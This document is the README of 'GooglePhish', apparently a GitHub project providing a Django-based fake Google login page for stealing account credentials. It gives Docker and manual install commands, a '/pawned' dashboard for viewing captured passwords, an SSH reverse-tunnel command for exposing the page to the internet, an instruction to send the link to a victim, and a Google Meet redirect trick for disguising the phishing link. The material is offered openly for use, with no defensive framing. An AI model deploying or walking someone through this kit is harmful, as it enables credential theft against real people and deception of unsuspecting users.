# GooglePhish

![GooglePhish](.images/GooglePhish-500x500.png)

- Google Account Phishing Tool using Python Django Framework.

- Screenshots
  | Screenshots | Screenshots |
  | ----------- | ----------- |
  | ![Google Login Page Phisher Home Page Image](.images/home-page.png)| ![Google Login Page Phisher Password Page Image](.images/password-page.png) |

## Fast Installation Using docker

- Pull created image
  - Install [Docker](https://www.docker.com/products/docker-desktop/)
  - Pull googlephish image

      ```bash
      docker pull dmdhrumilmistry/googlephish
      ```

  - run docker image

      ```bash
      docker run -d -p 8000:8000 dmdhrumilmistry/googlephish -e
      ```

- Build Image and run using build command

    
    ```bash
      sudo docker build -t googlephish . 
    ```
    You can specify your credentials using build arguments like this :
    > ℹ️ Please replace build arguments by your credentials
    ``` bash
    sudo docker build -t googlephish --build-arg dj_email="admin@mail.local" --build-arg dj_username="admin" --build-arg dj_password="GooglePhish" . 
    ```

    and run it :
    ```bash
    docker run -d -p 8000:8000 googlephish
    ```
    If you have build the dockerfile with no arguments, the default credentials are :
    * Username : `admin`
    * Password : `GooglePhish`

- Using Docker Compose

   ```bash
    docker-compose up
   ```
  
  > :warning: Doesn't work yet 
  

## Installation

- Clone/Download repo

    ```bash
    git clone https://github.com/dmdhrumilmistry/GooglePhish.git
    ```

- Install Poetry


- Install requirements

    ```bash
    poetry
    ```

- Check for errors

    ```bash
    python3 manage.py check
    ```

    > Proceed if no errors were encountered.

- migrate db

    ```bash
    python3 manage.py makemigrations
    python3 manage.py migrate
    ```

- Create user

    ```bash
    python3 manage.py createsuperuser
    ```

- Collect static files

    ```bash
    python3 manage.py collectstatic
    ```

- Run server

    ```bash
    python3 manage.py runserver
    ```

    > Use `--insecure` tag if any issue is encountered while loading static files.

## Generate and update new random key before using GooglePhish

- Generate and copy new key

    ```bash
    python3 generate_new_key.py
    ```

- update secret key in settings.py of GooglePhish on line 23

  ```python
    # SECURITY WARNING: keep the secret key used in production secret!
    SECRET_KEY = 'your_new_key'
  ```
  
## View Passwords using GooglePhish Dashboard Page

- Dashboard login page

    ```
    http://127.0.0.1:8000/pawned
    ```

## Start Server

```bash
python3 manage.py runserver
```

> if static files are not loading, turn on debug mode or use
>
> ```bash
> python3 manage.py runserver --insecure
> ```

## For phishing over the internet

- Start server

    ```bash
    python3 manage.py runserver
    ```

- forward port using ssh

    ```bash
    ssh -R 80:localhost:8000 localhost.run
    ```

    > 8000 is port of localhost server.
    > 80 is [localhost.run](https://localhost.run/) server port. Localhost is service that helps you to expose your server running on localhost to the internet, visit their [documentation](https://localhost.run/docs/) for more info

- Now send link to your victim

> You can redirect user from google meet to your phishing page link using
>
> ```
> https://meet.google.com/linkredirect?dest=your_link
> ```

## Project Maintainer

- [dmdhrumilmistry](https://github.com/dmdhrumilmistry)

## Contributors

[Contributors List](https://github.com/dmdhrumilmistry/GooglePhish/graphs/contributors)

### Have any Ideas 💡 or issue

- Create an issue
- Fork the repo, update script and create a Pull Request
